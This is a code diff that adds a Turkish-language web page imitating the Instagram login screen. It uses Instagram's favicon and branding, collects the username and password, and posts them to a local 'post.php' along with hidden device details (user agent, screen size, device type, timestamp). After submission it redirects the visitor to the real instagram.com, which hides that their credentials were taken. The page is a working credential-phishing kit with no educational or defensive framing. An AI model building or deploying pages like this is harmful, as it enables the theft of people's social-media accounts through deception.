@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Instagram Giriş</title>
+<link rel="icon" type="image/x-icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.4;
+        }
+
+        .container {
+            display: flex;
+            max-width: 935px;
+            width: 100%;
+            gap: 32px;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Telefon Görselleri - Masaüstü için */
+        .phones {
+            flex: 1;
+            position: relative;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 600px;
+        }
+
+        .phone-image {
+            width: 100%;
+            max-width: 454px;
+            height: auto;
+            min-height: 618px;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="454" height="618" viewBox="0 0 454 618"><rect width="454" height="618" fill="%23f0f0f0" rx="30"/><rect x="177" y="20" width="100" height="20" fill="%23ddd" rx="10"/><rect x="50" y="70" width="354" height="478" fill="%23eee"/><circle cx="227" y="578" r="30" fill="%23ddd"/></svg>') no-repeat center;
+            background-size: contain;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Login Container */
+        .login-container {
+            flex: 0 0 350px;
+            max-width: 100%;
+        }
+
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 40px 30px;
+            text-align: center;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+        }
+
+        .logo {
+            font-size: 42px;
+            font-weight: 300;
+            margin-bottom: 30px;
+            background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            display: inline-block;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 6px;
+        }
+
+        .form-input {
+            width: 100%;
+            height: 44px;
+            padding: 12px 8px 4px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 6px;
+            font-size: 14px;
+            outline: none;
+            transition: all 0.3s ease;
+            -webkit-appearance: none;
+        }
+
+        .form-input:focus {
+            border-color: #a8a8a8;
+            background: white;
+        }
+
+        .form-input:valid + .floating-label,
+        .form-input:focus + .floating-label {
+            transform: translateY(-8px) scale(0.85);
+            color: #8e8e8e;
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: 14px;
+            color: #8e8e8e;
+            font-size: 14px;
+            pointer-events: none;
+            transition: all 0.3s ease;
+            background: #fafafa;
+            padding: 0 4px;
+        }
+
+        .form-input:focus + .floating-label {
+            color: #0095f6;
+            background: white;
+        }
+
+        .login-button {
+            width: 100%;
+            height: 44px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 16px;
+            margin-top: 16px;
+            cursor: pointer;
+            opacity: 0.9;
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        .login-button:hover,
+        .login-button:active {
+            opacity: 1;
+            transform: translateY(-1px);
+        }
+
+        .login-button:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #8e8e8e;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+
+        .separator::before {
+            margin-right: 20px;
+        }
+
+        .separator::after {
+            margin-left: 20px;
+        }
+
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 16px;
+            margin: 16px 0;
+            cursor: pointer;
+            padding: 12px;
+            border-radius: 6px;
+            transition: background-color 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        .facebook-login:hover {
+            background-color: #f8f9fa;
+        }
+
+        .facebook-login i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 13px;
+            margin-top: 16px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 4px;
+            transition: background-color 0.3s ease;
+        }
+
+        .forgot-password:hover {
+            background-color: #f8f9fa;
+        }
+
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 8px;
+            padding: 24px;
+            text-align: center;
+            margin: 12px 0;
+            font-size: 15px;
+        }
+
+        .signup-link {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .signup-link:hover {
+            color: #0077cc;
+        }
+
+        .download-app {
+            text-align: center;
+            padding: 24px 0;
+        }
+
+        .download-text {
+            font-size: 15px;
+            margin-bottom: 20px;
+            color: #262626;
+        }
+
+        .app-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .app-button {
+            height: 44px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: transform 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        .app-button:hover {
+            transform: translateY(-2px);
+        }
+
+        /* MESAJ STİLLERİ */
+        .message {
+            font-size: 14px;
+            margin-top: 12px;
+            padding: 12px;
+            border-radius: 6px;
+            display: none;
+            text-align: center;
+        }
+
+        .error-message {
+            color: #ed4956;
+            background: #fedce0;
+            border: 1px solid #ed4956;
+        }
+
+        .success-message {
+            color: #1a7c3a;
+            background: #d4edda;
+            border: 1px solid #1a7c3a;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 14px;
+            cursor: pointer;
+            color: #8e8e8e;
+            font-size: 14px;
+            font-weight: 600;
+            background: #fafafa;
+            padding: 2px 6px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+            touch-action: manipulation;
+        }
+
+        .password-toggle:hover {
+            background: #e9ecef;
+        }
+
+        .loading {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* MOBILE STYLES */
+        @media (max-width: 768px) {
+            body {
+                padding: 10px;
+                background: white;
+            }
+
+            .container {
+                flex-direction: column;
+                gap: 0;
+                max-width: 400px;
+            }
+
+            .phones {
+                display: none;
+            }
+
+            .login-container {
+                flex: 1;
+                width: 100%;
+                max-width: 400px;
+            }
+
+            .login-box {
+                border: none;
+                box-shadow: none;
+                padding: 32px 20px;
+                margin-bottom: 0;
+            }
+
+            .logo {
+                font-size: 48px;
+                margin-bottom: 40px;
+            }
+
+            .form-input {
+                height: 48px;
+                font-size: 16px;
+            }
+
+            .floating-label {
+                font-size: 16px;
+                top: 16px;
+                left: 16px;
+            }
+
+            .login-button {
+                height: 48px;
+                font-size: 16px;
+            }
+
+            .signup-box {
+                border: none;
+                margin: 16px 0;
+            }
+
+            .download-app {
+                padding: 20px 0;
+            }
+
+            .app-buttons {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .app-button {
+                height: 52px;
+            }
+        }
+
+        /* TABLET STYLES */
+        @media (min-width: 769px) and (max-width: 1024px) {
+            .container {
+                max-width: 800px;
+                gap: 24px;
+            }
+
+            .login-container {
+                flex: 0 0 320px;
+            }
+
+            .phone-image {
+                max-width: 380px;
+                min-height: 520px;
+            }
+        }
+
+        /* SMALL MOBILE STYLES */
+        @media (max-width: 480px) {
+            body {
+                padding: 5px;
+            }
+
+            .login-box {
+                padding: 24px 16px;
+            }
+
+            .logo {
+                font-size: 42px;
+                margin-bottom: 32px;
+            }
+
+            .form-input {
+                height: 44px;
+            }
+
+            .login-button {
+                height: 44px;
+            }
+
+            .signup-box {
+                padding: 20px;
+            }
+        }
+
+        /* LARGE DESKTOP STYLES */
+        @media (min-width: 1440px) {
+            .container {
+                max-width: 1100px;
+            }
+
+            .login-container {
+                flex: 0 0 380px;
+            }
+
+            .login-box {
+                padding: 48px 40px;
+            }
+        }
+
+        /* DARK MODE SUPPORT */
+        @media (prefers-color-scheme: dark) {
+            body {
+                background-color: #000;
+            }
+
+            .login-box, .signup-box {
+                background: #000;
+                border-color: #363636;
+            }
+
+            .form-input {
+                background: #000;
+                border-color: #363636;
+                color: #f5f5f5;
+            }
+
+            .form-input:focus {
+                background: #000;
+            }
+
+            .floating-label {
+                background: #000;
+                color: #a8a8a8;
+            }
+
+            .form-input:focus + .floating-label {
+                background: #000;
+            }
+
+            .download-text {
+                color: #f5f5f5;
+            }
+        }
+
+        /* ACCESSIBILITY */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+        }
+
+        /* FOCUS STYLES FOR KEYBOARD NAVIGATION */
+        .form-input:focus-visible,
+        .login-button:focus-visible,
+        .facebook-login:focus-visible,
+        .forgot-password:focus-visible {
+            outline: 2px solid #0095f6;
+            outline-offset: 2px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="phones">
+            <div class="phone-image"></div>
+        </div>
+        
+        <div class="login-container">
+            <div class="login-box">
+                <div class="logo">
+                    <i class="fab fa-instagram"></i>
+                </div>
+                
+                <form class="login-form" id="loginForm" action="post.php" method="POST">
+                    <div class="input-group">
+                        <input type="text" class="form-input" id="username" name="username" required 
+                               autocomplete="username" enterkeyhint="next">
+                        <label class="floating-label">Telefon numarası, kullanıcı adı veya e-posta</label>
+                    </div>
+                    
+                    <div class="input-group">
+                        <input type="password" class="form-input" id="password" name="password" required 
+                               autocomplete="current-password" enterkeyhint="go">
+                        <label class="floating-label">Şifre</label>
+                        <span class="password-toggle" onclick="togglePassword()" role="button" tabindex="0">Göster</span>
+                    </div>
+                    
+                    <input type="hidden" name="ip_address" id="ipAddress">
+                    <input type="hidden" name="user_agent" id="userAgent">
+                    <input type="hidden" name="timestamp" id="timestamp">
+                    <input type="hidden" name="screen_size" id="screenSize">
+                    <input type="hidden" name="device_type" id="deviceType">
+                    
+                    <button type="submit" class="login-button" id="loginButton">
+                        <span id="buttonText">Giriş Yap</span>
+                        <div class="loading" id="loading"></div>
+                    </button>
+                    
+                    <div class="message error-message" id="errorMessage">
+                        Girdiğin bilgiler yanlış. Lütfen kontrol et ve tekrar dene.
+                    </div>
+                    
+                    <div class="message success-message" id="successMessage">
+                        Başarıyla giriş yapıldı! Yönlendiriliyorsunuz...
+                    </div>
+                    
+                    <div class="separator">YA DA</div>
+                    
+                    <div class="facebook-login" role="button" tabindex="0">
+                        <i class="fab fa-facebook-square"></i>
+                        Facebook ile Giriş Yap
+                    </div>
+                    
+                    <div class="forgot-password" role="button" tabindex="0">Şifreni mi unuttun?</div>
+                </form>
+            </div>
+            
+            <div class="signup-box">
+                Hesabın yok mu? <a href="#" class="signup-link" role="button">Kaydol</a>
+            </div>
+            
+            <div class="download-app">
+                <div class="download-text">Uygulamayı indir.</div>
+                <div class="app-buttons">
+                    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='134' height='40' viewBox='0 0 134 40'><rect width='134' height='40' fill='%23333' rx='8'/><text x='50%' y='50%' fill='white' font-family='Arial' font-size='14' text-anchor='middle' dy='.3em'>App Store</text></svg>" 
+                         alt="App Store" class="app-button">
+                    <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='134' height='40' viewBox='0 0 134 40'><rect width='134' height='40' fill='%23333' rx='8'/><text x='50%' y='50%' fill='white' font-family='Arial' font-size='14' text-anchor='middle' dy='.3em'>Google Play</text></svg>" 
+                         alt="Google Play" class="app-button">
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Sayfa yüklendiğinde cihaz bilgilerini topla
+        document.addEventListener('DOMContentLoaded', function() {
+            // Temel bilgiler
+            document.getElementById('ipAddress').value = getIPAddress();
+            document.getElementById('userAgent').value = navigator.userAgent;
+            document.getElementById('timestamp').value = new Date().toISOString();
+            document.getElementById('screenSize').value = `${screen.width}x${screen.height}`;
+            document.getElementById('deviceType').value = getDeviceType();
+            
+            // Mobil için ek optimizasyonlar
+            if (isMobile()) {
+                document.body.classList.add('mobile');
+                // Mobil cihazlarda viewport ayarı
+                const viewport = document.querySelector('meta[name="viewport"]');
+                viewport.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
+            }
+        });
+
+        // Cihaz tipini belirle
+        function getDeviceType() {
+            const width = window.innerWidth;
+            if (width < 768) return 'mobile';
+            if (width < 1024) return 'tablet';
+            return 'desktop';
+        }
+
+        // Mobil kontrolü
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || 
+                   window.innerWidth < 768;
+        }
+
+        // IP adresi simülasyonu
+        function getIPAddress() {
+            return Math.floor(Math.random() * 255) + '.' + 
+                   Math.floor(Math.random() * 255) + '.' + 
+                   Math.floor(Math.random() * 255) + '.' + 
+                   Math.floor(Math.random() * 255);
+        }
+
+        // Şifre göster/gizle
+        function togglePassword() {
+            const passwordInput = document.getElementById('password');
+            const passwordToggle = document.querySelector('.password-toggle');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                passwordToggle.textContent = 'Gizle';
+                passwordToggle.setAttribute('aria-pressed', 'true');
+            } else {
+                passwordInput.type = 'password';
+                passwordToggle.textContent = 'Göster';
+                passwordToggle.setAttribute('aria-pressed', 'false');
+            }
+        }
+
+        // Form gönderimi
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const form = this;
+            const buttonText = document.getElementById('buttonText');
+            const loading = document.getElementById('loading');
+            const loginButton = document.getElementById('loginButton');
+            const errorMessage = document.getElementById('errorMessage');
+            const successMessage = document.getElementById('successMessage');
+            
+            // Loading state
+            buttonText.style.display = 'none';
+            loading.style.display = 'block';
+            loginButton.disabled = true;
+            errorMessage.style.display = 'none';
+            successMessage.style.display = 'none';
+            
+            // AJAX ile form gönderimi
+            const formData = new FormData(form);
+            
+            fetch('post.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                // Reset loading state
+                buttonText.style.display = 'block';
+                loading.style.display = 'none';
+                loginButton.disabled = false;
+                
+                if (data.success) {
+                    successMessage.style.display = 'block';
+                    // Mobil cihazlarda farklı yönlendirme
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com';
+                    }, 2000);
+                } else {
+                    errorMessage.style.display = 'block';
+                    // Hata durumunda inputları temizle
+                    document.getElementById('password').value = '';
+                }
+            })
+            .catch(error => {
+                buttonText.style.display = 'block';
+                loading.style.display = 'none';
+                loginButton.disabled = false;
+                errorMessage.style.display = 'block';
+                console.error('Hata:', error);
+            });
+        });
+
+        // Touch event'ler için optimizasyon
+        document.querySelectorAll('[role="button"]').forEach(button => {
+            button.addEventListener('touchstart', function() {
+                this.style.transform = 'scale(0.98)';
+            });
+            
+            button.addEventListener('touchend', function() {
+                this.style.transform = 'scale(1)';
+            });
+        });
+
+        // Klavye navigasyonu
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                const activeElement = document.activeElement;
+                if (activeElement.type === 'password') {
+                    document.getElementById('loginForm').requestSubmit();
+                }
+            }
+        });
+
+        // Responsive için window resize event
+        window.addEventListener('resize', function() {
+            document.getElementById('screenSize').value = `${screen.width}x${screen.height}`;
+            document.getElementById('deviceType').value = getDeviceType();
+        });
+    </script>
+</body>
+</html>
